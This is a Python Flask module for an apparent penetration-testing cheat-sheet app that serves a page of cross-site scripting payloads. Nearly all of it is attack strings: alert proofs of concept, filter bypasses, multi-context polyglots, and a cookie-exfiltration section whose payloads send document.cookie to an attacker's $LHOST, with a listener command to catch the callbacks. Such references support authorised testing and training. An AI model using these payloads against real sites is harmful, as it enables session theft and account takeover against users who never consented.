from flask import Blueprint, render_template

bp = Blueprint("xss", __name__)

CARDS = [
    {"title": "Basic", "hint": "Reflected / stored proof of concept.", "blocks": [
        {"tpl": "<script>alert(1)</script>", "plain": True},
        {"tpl": '"><script>alert(1)</script>', "plain": True},
        {"tpl": "<img src=x onerror=alert(1)>", "plain": True},
        {"tpl": "<svg onload=alert(1)>", "plain": True},
        {"tpl": "<body onload=alert(1)>", "plain": True},
    ]},
    {"title": "Cookie / data exfil", "hint": "Sends to your $LHOST — start a listener.", "blocks": [
        {"tpl": "<script>new Image().src='http://$LHOST/?c='+document.cookie</script>", "plain": True},
        {"tpl": "<script>fetch('http://$LHOST/?c='+encodeURIComponent(document.cookie))</script>", "plain": True},
        {"tpl": "<img src=x onerror=this.src='http://$LHOST/?c='+document.cookie>", "plain": True},
    ]},
    {"title": "Filter bypass", "blocks": [
        {"tpl": "<sCrIpt>alert(1)</sCrIpt>", "plain": True},
        {"tpl": "<svg><script>alert&#40;1&#41;</script>", "plain": True},
        {"tpl": "javascript:alert(1)", "plain": True},
        {"tpl": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//", "plain": True},
    ]},
    {"title": "Polyglots", "hint": "Single strings that fire across multiple contexts (attribute, tag, JS, comment).", "blocks": [
        {"tpl": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "plain": True, "lbl": "0xsobky — the classic all-context polyglot"},
        {"tpl": "'\"><img src=x onerror=alert()>", "plain": True, "lbl": "attribute break-out + img"},
        {"tpl": "\">'><svg/onload=alert()>", "plain": True, "lbl": "quote/tag break-out + svg"},
        {"tpl": "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload=alert()//>", "plain": True, "lbl": "context-closer polyglot"},
        {"tpl": "-->'\"/></sCript><deTails/open/ontoggle=confirm(document.domain)>", "plain": True, "lbl": "comment/script escape + ontoggle"},
        {"tpl": "%0ajavascript:alert()//", "plain": True, "lbl": "newline + uri scheme (href/src sinks)"},
        {"tpl": "\"><script>alert(String.fromCharCode(88,83,83))</script>", "plain": True, "lbl": "fromCharCode (no literal quotes in payload body)"},
    ]},
    {"title": "Listener", "hint": "Catch the callback.", "blocks": [
        {"tpl": "python3 -m http.server 80"},
    ]},
]


@bp.route("/xss")
def index():
    return render_template("cheat.html", active="xss",
                           title="Cross-site scripting", tag="exploitation",
                           intro="PoC payloads, exfiltration, and filter bypasses.",
                           cards=CARDS)


MODULE = {"id": "xss", "title": "XSS", "category": "Exploitation",
          "order": 1, "blueprint": bp, "endpoint": "xss.index"}
